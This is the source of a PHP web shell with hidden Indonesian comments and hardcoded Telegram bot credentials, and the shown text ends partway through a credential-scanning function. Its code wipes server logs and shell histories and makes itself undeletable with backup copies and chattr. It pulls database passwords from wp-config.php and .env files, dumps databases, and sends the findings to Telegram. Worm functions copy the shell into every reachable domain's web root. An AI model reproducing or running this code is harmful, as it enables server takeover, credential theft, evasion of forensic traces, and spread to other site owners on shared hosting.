<?php
//=========Maker: Dkid03
//PLSS DON'T CHANGE AUTHOR 
// ==================== LOGOUT HANDLER ====================
if (isset($_GET['logout'])) {
    session_start();
    $_SESSION['logout_success'] = true;
    session_destroy();
    header('Location: ?');
    exit;
}

session_start();

// ===== DEBUG MODE =====
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ==================== KONFIGURASI ====================
$botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
$telegramUserId = '7547598395';
$verifCode = 'Dkid@123';

if (!function_exists('shell_exec')) {
    function shell_exec($cmd) { return 'shell_exec tidak tersedia di server ini.'; }
}

$rootPath = realpath(__DIR__);
$editableExtensions = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'ini', 'log', 'htaccess'];
$specialDirectories = [
    'public_html' => realpath($_SERVER['DOCUMENT_ROOT'] ?? ''),
    'user' => realpath('/home'),
    'etc' => realpath('/etc'),
    'log' => realpath('/var/log'),
    'homeshell' => $rootPath
];
$specialDirectories = array_filter($specialDirectories, function($d) { return $d && is_dir($d); });

// ==================== FUNGSI UTILITY ====================
function sendTelegramMessage($botToken, $chatId, $message) {
    if (empty($botToken) || empty($chatId) || empty($message)) return false;
    
    if (strlen($message) > 4096) {
        $message = substr($message, 0, 4000) . "\n\n... (dipotong)";
    }
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId, 
        'text' => $message, 
        'parse_mode' => 'HTML', 
        'disable_web_page_preview' => true
    ];
    $postData = http_build_query($data);
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($result !== false && $httpCode == 200) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) {
                return true;
            }
        }
    }
    
    if (ini_get('allow_url_fopen')) {
        $options = [
            'http' => [
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => $postData,
                'timeout' => 30
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ];
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        
        if ($result !== false) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) {
                return true;
            }
        }
    }
    
    return false;
}

function isRoot() {
    if (!function_exists('shell_exec')) return false;
    $output = @shell_exec('whoami 2>/dev/null');
    return trim($output) === 'root';
}

function isShellExecAvailable() {
    if (!function_exists('shell_exec')) return false;
    $disabled = explode(',', ini_get('disable_functions') ?: '');
    return !in_array('shell_exec', array_map('trim', $disabled));
}

function formatSize($bytes) {
    if ($bytes === false || $bytes === null) return '0 bytes';
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? deleteDirectory($path) : @unlink($path);
    }
    return rmdir($dir);
}

function breadcrumb($path, $rootPath, $specialDirs) {
    $breadcrumb = '<a href="?path=">Home</a> <span style="color:#8b949e;">/</span> ';
    foreach ($specialDirs as $name => $dirPath) {
        if ($dirPath && is_dir($dirPath)) {
            $breadcrumb .= '<a href="?path=' . urlencode($dirPath) . '">' . htmlspecialchars($name) . '</a> <span style="color:#8b949e;">/</span> ';
        }
    }
    $relative = str_replace($rootPath, '', $path);
    $parts = array_filter(explode('/', $relative));
    $current = '';
    foreach ($parts as $part) {
        $current .= '/' . $part;
        $breadcrumb .= '<a href="?path=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a> <span style="color:#8b949e;">/</span> ';
    }
    return rtrim($breadcrumb, ' /');
}

function isSafePath($path, $rootPath, $specialDirs) {
    if (strpos($path, $rootPath) === 0) return true;
    foreach ($specialDirs as $dirPath) {
        if ($dirPath && strpos($path, $dirPath) === 0) return true;
    }
    return false;
}

function getAllSubDirectories($dir) {
    $subDirs = [];
    if (!is_dir($dir) || !is_readable($dir)) return $subDirs;
    $items = @scandir($dir);
    if ($items === false) return $subDirs;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && !is_link($path)) {
            $subDirs[] = $path;
            $subDirs = array_merge($subDirs, getAllSubDirectories($path));
        }
    }
    return $subDirs;
}

function getImmediateSubDirectories($dir) {
    $subDirs = [];
    if (!is_dir($dir) || !is_readable($dir)) return $subDirs;
    $items = @scandir($dir);
    if ($items === false) return $subDirs;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && !is_link($path)) $subDirs[] = $path;
    }
    return $subDirs;
}

function bulkDeleteFiles($baseDir, $fileList, $mode) {
    $targetDirs = [$baseDir];
    if ($mode === 'shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($baseDir));
    elseif ($mode === 'deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($baseDir));
    $results = ['deleted' => [], 'not_found' => [], 'errors' => []];
    $files = array_filter(array_map('trim', explode("\n", $fileList)));
    foreach ($targetDirs as $dir) {
        if (!is_dir($dir) || !is_writable($dir)) continue;
        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . basename($file);
            if (is_file($path)) @unlink($path) ? $results['deleted'][] = $path : $results['errors'][] = $path;
            elseif (!in_array($file, $results['not_found'])) $results['not_found'][] = $file;
        }
    }
    return $results;
}

function getSystemInfo() {
    return [
        'PHP Version' => phpversion(),
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'Server API' => php_sapi_name(),
        'max_execution_time' => ini_get('max_execution_time') . ' seconds',
        'memory_limit' => ini_get('memory_limit'),
        'upload_max_filesize' => ini_get('upload_max_filesize'),
        'post_max_size' => ini_get('post_max_size'),
        'Disabled Functions' => ini_get('disable_functions') ?: 'none',
        'Safe Mode' => ini_get('safe_mode') ? 'On' : 'Off',
        'Operating System' => php_uname('s') . ' ' . php_uname('r'),
        'Current User' => get_current_user(),
        'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
        'Script Path' => __FILE__
    ];
}

function isTerminalActive() {
    if (!function_exists('shell_exec')) return false;
    if (ini_get('safe_mode')) return false;
    $disabled = explode(',', ini_get('disable_functions') ?: '');
    if (in_array('shell_exec', array_map('trim', $disabled))) return false;
    return @shell_exec('echo 1') !== null;
}

// ==================== CLEAN TRACES ====================
function clean_traces() {
    global $botToken, $telegramUserId;
    $results = [];
    
    $access_logs = ['/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/httpd/access_log'];
    foreach ($access_logs as $log) {
        if (file_exists($log) && is_writable($log)) {
            @file_put_contents($log, '');
            $results[] = "Cleaned: $log";
        }
    }
    
    $error_logs = ['/var/log/apache2/error.log', '/var/log/nginx/error.log', '/var/log/httpd/error_log'];
    foreach ($error_logs as $log) {
        if (file_exists($log) && is_writable($log)) {
            @file_put_contents($log, '');
            $results[] = "Cleaned: $log";
        }
    }
    
    if (function_exists('shell_exec')) {
        $users = @explode("\n", @shell_exec('ls /home 2>/dev/null'));
        if ($users !== false) {
            foreach ($users as $user) {
                $user = trim($user);
                if (empty($user)) continue;
                $hist = "/home/$user/.bash_history";
                if (file_exists($hist)) @file_put_contents($hist, '');
                $hist = "/home/$user/.mysql_history";
                if (file_exists($hist)) @file_put_contents($hist, '');
            }
        }
        if (file_exists('/root/.bash_history')) @file_put_contents('/root/.bash_history', '');
        if (file_exists('/root/.mysql_history')) @file_put_contents('/root/.mysql_history', '');
    }
    
    $msg = "🧹 *Traces Cleaned*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $results;
}

// ==================== GET ALL DOCUMENT ROOTS (CACHED) ====================
function get_all_document_roots_cached($ttl = 300) {
    $cache_file = __DIR__ . '/.docroots_cache';
    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $ttl)) {
        $data = @file_get_contents($cache_file);
        if ($data !== false) {
            $roots = json_decode($data, true);
            if (is_array($roots) && !empty($roots)) return $roots;
        }
    }
    $roots = []; 
    $processed = [];
    
    if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, ':') === false) continue;
                list($domain, $user) = explode(':', $line);
                $user = trim($user);
                if (!empty($user) && !in_array($user, $processed)) {
                    $docRoot = "/home/{$user}/public_html";
                    if (is_dir($docRoot)) { 
                        $roots[] = $docRoot; 
                        $processed[] = $user; 
                    }
                    $docRoot = "/home/{$user}/www";
                    if (is_dir($docRoot)) { 
                        $roots[] = $docRoot; 
                        $processed[] = $user . '_www'; 
                    }
                }
            }
        }
    }
    
    $homeDirs = @glob('/home/*', GLOB_ONLYDIR);
    if ($homeDirs !== false) {
        foreach ($homeDirs as $home) {
            $user = basename($home);
            if (in_array($user, $processed)) continue;
            $docRoot = $home . '/public_html';
            if (is_dir($docRoot)) { 
                $roots[] = $docRoot; 
                $processed[] = $user; 
            }
            $docRoot = $home . '/www';
            if (is_dir($docRoot)) { 
                $roots[] = $docRoot; 
                $processed[] = $user . '_www'; 
            }
        }
    }
    
    if (isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT']) && !in_array($_SERVER['DOCUMENT_ROOT'], $roots)) {
        $roots[] = $_SERVER['DOCUMENT_ROOT'];
    }
    
    $extraDirs = ['/tmp', '/var/tmp', '/home', '/var/log', '/etc', '/usr/local', '/opt', '/srv'];
    foreach ($extraDirs as $dir) {
        if (is_dir($dir) && !in_array($dir, $roots)) {
            $roots[] = $dir;
        }
        $subs = @glob($dir . '/*', GLOB_ONLYDIR);
        if ($subs !== false) {
            foreach ($subs as $sub) {
                if (is_dir($sub) && is_writable($sub) && !in_array($sub, $roots)) {
                    $roots[] = $sub;
                }
            }
        }
    }
    
    $roots = array_unique($roots);
    $roots = array_filter($roots, 'is_dir');
    $roots = array_values($roots);
    
    @file_put_contents($cache_file, json_encode($roots));
    return $roots;
}

function get_all_domains_by_ip_cached($ttl = 300) {
    $cache_file = __DIR__ . '/.domains_cache';
    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $ttl)) {
        $data = @file_get_contents($cache_file);
        if ($data !== false) {
            $domains = json_decode($data, true);
            if (is_array($domains) && !empty($domains)) return $domains;
        }
    }
    $domains = [];
    $ip = $_SERVER['SERVER_ADDR'] ?? '';
    
    if (empty($ip) && function_exists('shell_exec')) {
        $ip = trim(@shell_exec('hostname -I 2>/dev/null | awk \'{print $1}\''));
    }
    $ip = trim($ip);
    
    if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, ':') === false) continue;
                list($domain, $user) = explode(':', $line);
                $domains[] = trim($domain);
            }
        }
    }
    
    if (file_exists('/etc/domains') && is_readable('/etc/domains')) {
        $lines = @file('/etc/domains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, '=') === false) continue;
                list($domain, $user) = explode('=', $line);
                $domains[] = trim($domain);
            }
        }
    }
    
    $apacheConfigs = ['/etc/apache2/sites-enabled/*.conf', '/etc/httpd/conf.d/*.conf', '/etc/apache2/apache2.conf', '/etc/httpd/conf/httpd.conf'];
    foreach ($apacheConfigs as $pattern) {
        $files = @glob($pattern);
        if ($files === false) continue;
        foreach ($files as $conf) {
            if (!is_file($conf) || !is_readable($conf)) continue;
            $content = @file_get_contents($conf);
            if ($content === false) continue;
            preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches);
            foreach ($matches[1] as $domain) $domains[] = trim($domain);
            preg_match_all('/ServerAlias\s+([^\s]+)/i', $content, $matches2);
            foreach ($matches2[1] as $domain) $domains[] = trim($domain);
            preg_match_all('/<VirtualHost[^>]*>\s*ServerName\s+([^\s]+)/i', $content, $matches3);
            foreach ($matches3[1] as $domain) $domains[] = trim($domain);
        }
    }
    
    $nginxConfigs = ['/etc/nginx/sites-enabled/*.conf', '/etc/nginx/conf.d/*.conf', '/etc/nginx/nginx.conf'];
    foreach ($nginxConfigs as $pattern) {
        $files = @glob($pattern);
        if ($files === false) continue;
        foreach ($files as $conf) {
            if (!is_file($conf) || !is_readable($conf)) continue;
            $content = @file_get_contents($conf);
            if ($content === false) continue;
            preg_match_all('/server_name\s+([^;]+)/i', $content, $matches);
            foreach ($matches[1] as $server_names) {
                foreach (explode(' ', $server_names) as $domain) {
                    $domain = trim($domain);
                    if (!empty($domain) && $domain != '_') $domains[] = $domain;
                }
            }
        }
    }
    
    if (function_exists('shell_exec') && !empty($ip)) {
        $hostname = @shell_exec("host $ip 2>/dev/null | awk '{print \$5}'");
        if ($hostname && strpos($hostname, '.') !== false) $domains[] = trim($hostname);
    }
    
    $namedFiles = @glob('/var/named/*.db');
    if ($namedFiles !== false) {
        foreach ($namedFiles as $file) {
            if (!is_file($file) || !is_readable($file)) continue;
            $content = @file_get_contents($file);
            if ($content === false) continue;
            preg_match_all('/\s+IN\s+A\s+([0-9.]+)/', $content, $matches);
            foreach ($matches[1] as $dnsIp) {
                if (trim($dnsIp) == $ip) {
                    $domain = basename($file, '.db');
                    if (!empty($domain) && strpos($domain, '.') !== false) $domains[] = $domain;
                }
            }
        }
    }
    
    if (file_exists('/etc/hosts') && is_readable('/etc/hosts')) {
        $lines = @file('/etc/hosts');
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, $ip) !== false && strpos($line, 'localhost') === false) {
                    $parts = preg_split('/\s+/', trim($line));
                    foreach ($parts as $part) {
                        if (filter_var($part, FILTER_VALIDATE_IP) === false && strpos($part, '.') !== false) $domains[] = $part;
                    }
                }
            }
        }
    }
    
    $blacklist = ['www.example.com', 'localhost', '127.0.0.1'];
    $domains = array_unique($domains);
    $domains = array_filter($domains, function($d) use ($blacklist) {
        return !empty($d) && strpos($d, '.') !== false && strpos($d, '*') === false && !in_array($d, $blacklist);
    });
    $domains = array_values($domains);
    
    @file_put_contents($cache_file, json_encode($domains));
    return $domains;
}

// ==================== ANTI-DELETE ULTIMATE ====================
function anti_delete_ultimate() {
    $currentFile = __FILE__;
    $backupLocations = [
        dirname(__DIR__) . '/.cache/temp.inc',
        '/tmp/' . md5($currentFile) . '.inc',
        '/var/tmp/' . md5($currentFile) . '.inc',
        '/dev/shm/' . md5($currentFile) . '.inc'
    ];
    if (file_exists($currentFile)) {
        foreach ($backupLocations as $backup) {
            $dir = dirname($backup);
            if (!is_dir($dir)) @mkdir($dir, 0700, true);
            if (!file_exists($backup)) {
                @copy($currentFile, $backup);
                @chmod($backup, 0444);
                if (function_exists('shell_exec')) @shell_exec("chattr +i " . escapeshellarg($backup) . " 2>/dev/null");
            }
        }
        if (function_exists('shell_exec')) @shell_exec("chattr +i " . escapeshellarg($currentFile) . " 2>/dev/null");
        @chmod($currentFile, 0444);
    }
    if (!file_exists($currentFile)) {
        foreach ($backupLocations as $backup) {
            if (file_exists($backup)) {
                @copy($backup, $currentFile);
                @chmod($currentFile, 0444);
                if (function_exists('shell_exec')) @shell_exec("chattr +i " . escapeshellarg($currentFile) . " 2>/dev/null");
                sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], "✅ System cache restored from: " . basename($backup));
                return true;
            }
        }
    }
    return false;
}
anti_delete_ultimate();

// ==================== SYSTEM CACHE REPAIR ====================
function system_cache_repair() { return anti_delete_ultimate(); }

if (isset($_GET['cache_repair'])) { system_cache_repair(); echo "✅ System cache repair executed."; exit; }

// ==================== DUMP DATABASES (REAL) ====================
function dump_databases() {
    global $botToken, $telegramUserId;
    $results = [];
    $found_configs = [];
    $roots = get_all_document_roots_cached();
    
    // Cari file konfigurasi database
    $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php', 'settings.php'];
    
    foreach ($roots as $root) {
        if (!is_dir($root) || !is_readable($root)) continue;
        
        foreach ($config_files as $file) {
            $path = $root . '/' . $file;
            if (file_exists($path) && is_readable($path)) {
                $content = @file_get_contents($path);
                if ($content === false) continue;
                
                // Extract database credentials
                $patterns = [
                    '/(DB_HOST|DB_NAME|DB_USER|DB_PASS|DB_PASSWORD|DB_DATABASE)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
                    '/define\(\s*[\'"]?(DB_HOST|DB_NAME|DB_USER|DB_PASSWORD|DB_DATABASE)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
                ];
                
                $creds = [];
                foreach ($patterns as $pattern) {
                    preg_match_all($pattern, $content, $matches);
                    if (!empty($matches[1]) && !empty($matches[2])) {
                        foreach ($matches[1] as $i => $key) {
                            $creds[] = $key . ': ' . trim($matches[2][$i]);
                        }
                    }
                }
                
                if (!empty($creds)) {
                    $found_configs[] = "📁 " . basename($path) . ":\n" . implode("\n", array_unique($creds));
                }
            }
        }
    }
    
    // Coba dump database via shell
    if (function_exists('shell_exec')) {
        // Cek MySQL
        $mysql = @shell_exec('mysql --version 2>/dev/null');
        if (strpos($mysql, 'mysql') !== false) {
            // Coba dapatkan kredensial dari env
            $dbHost = getenv('DB_HOST') ?: 'localhost';
            $dbUser = getenv('DB_USER') ?: 'root';
            $dbPass = getenv('DB_PASS') ?: '';
            $dbName = getenv('DB_NAME') ?: '';
            
            // Coba dari wp-config
            foreach ($roots as $root) {
                if (file_exists($root . '/wp-config.php')) {
                    $content = file_get_contents($root . '/wp-config.php');
                    if (preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $h)) $dbHost = $h[1];
                    if (preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $u)) $dbUser = $u[1];
                    if (preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $p)) $dbPass = $p[1];
                    if (preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $n)) $dbName = $n[1];
                    break;
                }
            }
            
            if ($dbUser && $dbName) {
                $dumpFile = '/tmp/db_dump_' . time() . '.sql';
                $cmd = "mysqldump -h" . escapeshellarg($dbHost) . " -u" . escapeshellarg($dbUser);
                if (!empty($dbPass)) $cmd .= " -p" . escapeshellarg($dbPass);
                $cmd .= " " . escapeshellarg($dbName) . " 2>/dev/null > " . escapeshellarg($dumpFile);
                @shell_exec($cmd);
                
                if (file_exists($dumpFile) && filesize($dumpFile) > 100) {
                    $results[] = "💾 Database dumped: " . $dbName . " (" . formatSize(filesize($dumpFile)) . ")";
                }
            }
        }
    }
    
    if (empty($found_configs) && empty($results)) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan database atau kredensial.");
        return [];
    }
    
    $msg = "💾 *DATABASE DUMP*\n\n";
    if (!empty($found_configs)) {
        $msg .= "📋 *Config Files Found:*\n" . implode("\n", $found_configs);
    }
    if (!empty($results)) {
        $msg .= "\n\n📁 *Dump Files:*\n" . implode("\n", $results);
    }
    
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return array_merge($found_configs, $results);
}

// ==================== WORM FUNCTIONS ====================
function get_best_document_root($domain, $roots) {
    $candidates = [
        "/home/{$domain}/public_html",
        "/home/{$domain}/www",
        "/var/www/{$domain}/public_html",
        "/var/www/{$domain}/html",
        "/var/www/html/{$domain}",
        (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . "/../" . $domain . "/public_html" : ''),
    ];
    foreach ($roots as $root) if (strpos($root, $domain) !== false) $candidates[] = $root;
    usort($candidates, function($a, $b) {
        $a_score = (strpos($a, 'public_html') !== false) ? 1 : 0;
        $b_score = (strpos($b, 'public_html') !== false) ? 1 : 0;
        return $b_score - $a_score;
    });
    foreach ($candidates as $path) if ($path && is_dir($path) && is_writable($path)) return $path;
    return false;
}

function worm_spread_to_domains($currentFile) {
    global $botToken, $telegramUserId;
    $infected = []; 
    $domainLinks = [];
    $domains = get_all_domains_by_ip_cached(); 
    $roots = get_all_document_roots_cached();
    $myFile = basename($currentFile);
    
    foreach ($domains as $domain) {
        $dir = get_best_document_root($domain, $roots);
        if ($dir && is_dir($dir) && is_writable($dir)) {
            $targetFile = $dir . '/' . $myFile;
            if (!file_exists($targetFile)) { 
                if (@copy($currentFile, $targetFile)) {
                    @chmod($targetFile, 0644); 
                    $infected[] = $dir;
                    $domainLinks[] = "http://{$domain}/{$myFile}";
                }
            } else {
                $domainLinks[] = "http://{$domain}/{$myFile} (exists)";
            }
        }
    }
    
    if (empty($infected)) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada domain yang bisa diinfeksi.");
        return [];
    }
    
    $msg = "🪱 *WORM SPREAD TO DOMAINS*\n\n"
         . "📊 Total domain: " . count($domains) . "\n"
         . "✅ Berhasil: " . count($infected) . "\n\n"
         . "🔗 *Links:*\n" . implode("\n", $domainLinks);
    
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $infected;
}

// ==================== WORM INFECT ALL DOMAINS ====================
function worm_infect_all_domains($currentFile) {
    global $botToken, $telegramUserId;
    $infected = [];
    $domainLinks = [];
    $errors = [];
    $all_domains = [];
    $myFile = basename($currentFile);
    
    // SCAN APACHE
    if (function_exists('shell_exec')) {
        $apache_configs = [
            '/etc/apache2/sites-enabled/*.conf',
            '/etc/apache2/sites-available/*.conf',
            '/etc/httpd/conf.d/*.conf',
            '/etc/httpd/conf/httpd.conf',
            '/etc/apache2/apache2.conf'
        ];
        foreach ($apache_configs as $pattern) {
            $files = @glob($pattern);
            if ($files !== false) {
                foreach ($files as $conf) {
                    if (!is_file($conf) || !is_readable($conf)) continue;
                    $content = @file_get_contents($conf);
                    if ($content === false) continue;
                    preg_match_all('/DocumentRoot\s+([^\s]+)/i', $content, $matches);
                    foreach ($matches[1] as $dir) {
                        $dir = trim($dir);
                        $dir = str_replace(['"', "'"], '', $dir);
                        if (!empty($dir) && is_dir($dir)) {
                            $all_domains[] = ['dir' => $dir, 'source' => 'apache'];
                        }
                    }
                    preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches2);
                    foreach ($matches2[1] as $domain) {
                        $domain = trim($domain);
                        if (!empty($domain) && strpos($domain, '.') !== false) {
                            $all_domains[] = ['domain' => $domain, 'source' => 'apache'];
                        }
                    }
                }
            }
        }
    }
    
    // SCAN NGINX
    if (function_exists('shell_exec')) {
        $nginx_configs = [
            '/etc/nginx/sites-enabled/*.conf',
            '/etc/nginx/sites-available/*.conf',
            '/etc/nginx/conf.d/*.conf',
            '/etc/nginx/nginx.conf'
        ];
        foreach ($nginx_configs as $pattern) {
            $files = @glob($pattern);
            if ($files !== false) {
                foreach ($files as $conf) {
                    if (!is_file($conf) || !is_readable($conf)) continue;
                    $content = @file_get_contents($conf);
                    if ($content === false) continue;
                    preg_match_all('/root\s+([^;]+)/i', $content, $matches);
                    foreach ($matches[1] as $dir) {
                        $dir = trim($dir);
                        $dir = str_replace(['"', "'"], '', $dir);
                        if (!empty($dir) && is_dir($dir)) {
                            $all_domains[] = ['dir' => $dir, 'source' => 'nginx'];
                        }
                    }
                    preg_match_all('/server_name\s+([^;]+)/i', $content, $matches2);
                    foreach ($matches2[1] as $domains) {
                        $domains = trim($domains);
                        foreach (explode(' ', $domains) as $domain) {
                            $domain = trim($domain);
                            if (!empty($domain) && $domain != '_' && strpos($domain, '.') !== false) {
                                $all_domains[] = ['domain' => $domain, 'source' => 'nginx'];
                            }
                        }
                    }
                }
            }
        }
    }
    
    // SCAN CPANEL
    if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, ':') === false) continue;
                list($domain, $user) = explode(':', $line);
                $domain = trim($domain);
                $user = trim($user);
                if (!empty($domain) && !empty($user)) {
                    $dirs = [
                        "/home/{$user}/public_html",
                        "/home/{$user}/www",
                        "/home/{$user}/public",
                        "/home/{$user}/html"
                    ];
                    foreach ($dirs as $dir) {
                        if (is_dir($dir)) {
                            $all_domains[] = ['dir' => $dir, 'domain' => $domain, 'source' => 'cpanel'];
                            break;
                        }
                    }
                }
            }
        }
    }
    
    // SCAN /home
    $home_dirs = @glob('/home/*', GLOB_ONLYDIR);
    if ($home_dirs !== false) {
        foreach ($home_dirs as $home) {
            $user = basename($home);
            $dirs = [
                $home . '/public_html',
                $home . '/www',
                $home . '/public',
                $home . '/html'
            ];
            foreach ($dirs as $dir) {
                if (is_dir($dir)) {
                    $all_domains[] = ['dir' => $dir, 'source' => 'home', 'user' => $user];
                    break;
                }
            }
        }
    }
    
    // SCAN COMMON DIRS
    $common_dirs = [
        '/var/www/html',
        '/var/www',
        '/usr/share/nginx/html',
        '/usr/local/apache2/htdocs',
        '/var/www/vhosts',
        '/srv/www'
    ];
    foreach ($common_dirs as $dir) {
        if (is_dir($dir)) {
            $all_domains[] = ['dir' => $dir, 'source' => 'common'];
            $subs = @glob($dir . '/*', GLOB_ONLYDIR);
            if ($subs !== false) {
                foreach ($subs as $sub) {
                    if (is_dir($sub)) {
                        $all_domains[] = ['dir' => $sub, 'source' => 'common_sub'];
                    }
                }
            }
        }
    }
    
    // SCAN DOCUMENT ROOTS
    $roots = get_all_document_roots_cached();
    foreach ($roots as $root) {
        if (is_dir($root)) {
            $all_domains[] = ['dir' => $root, 'source' => 'docroot'];
        }
    }
    
    // REMOVE DUPLICATES & INFECT
    $unique_dirs = [];
    $unique_domains = [];
    $dirs_to_infect = [];
    foreach ($all_domains as $item) {
        if (isset($item['dir']) && !empty($item['dir']) && is_dir($item['dir']) && !in_array($item['dir'], $unique_dirs)) {
            $unique_dirs[] = $item['dir'];
            $dirs_to_infect[] = $item;
        }
        if (isset($item['domain']) && !empty($item['domain']) && !in_array($item['domain'], $unique_domains)) {
            $unique_domains[] = $item['domain'];
        }
    }
    
    $total_dirs = count($dirs_to_infect);
    $success_count = 0;
    foreach ($dirs_to_infect as $item) {
        $dir = $item['dir'];
        $domain = $item['domain'] ?? 'unknown';
        if (!is_writable($dir)) {
            @chmod($dir, 0755);
            if (!is_writable($dir)) {
                $errors[] = "❌ $dir (not writable)";
                continue;
            }
        }
        $targetFile = $dir . '/' . $myFile;
        if (file_exists($targetFile)) {
            $domainLinks[] = "http://{$domain}/{$myFile} (exists)";
            continue;
        }
        if (@copy($currentFile, $targetFile)) {
            @chmod($targetFile, 0644);
            $infected[] = $targetFile;
            $success_count++;
            $domainLinks[] = "http://{$domain}/{$myFile}";
        } else {
            $errors[] = "❌ Gagal copy ke: $dir";
        }
    }
    
    $msg = "🪱 *WORM INFECT ALL DOMAINS*\n\n"
         . "📊 Total direktori: $total_dirs\n"
         . "✅ Berhasil: $success_count\n"
         . "❌ Gagal: " . count($errors) . "\n"
         . "🌐 Total domain: " . count($unique_domains) . "\n\n"
         . "🔗 *Links:*\n" . implode("\n", array_slice($domainLinks, 0, 20));
    
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['infected' => $infected, 'links' => $domainLinks, 'errors' => $errors];
}

// ==================== SCAN WORDPRESS/LARAVEL (REAL) ====================
function scan_wordpress_laravel() {
    global $botToken, $telegramUserId;
    $found = [];
    $roots = get_all_document_roots_cached();
    
    foreach ($roots as $root) {
        if (!is_dir($root) || !is_readable($root)) continue;
        
        // ===== SCAN WORDPRESS =====
        if (file_exists($root . '/wp-config.php') && is_readable($root . '/wp-config.php')) {
            $wp_config = file_get_contents($root . '/wp-config.php');
            $creds = [];
            
            preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_name);
            preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_user);
            preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_pass);
            preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_host);
            
            $creds[] = "📁 WordPress: $root";
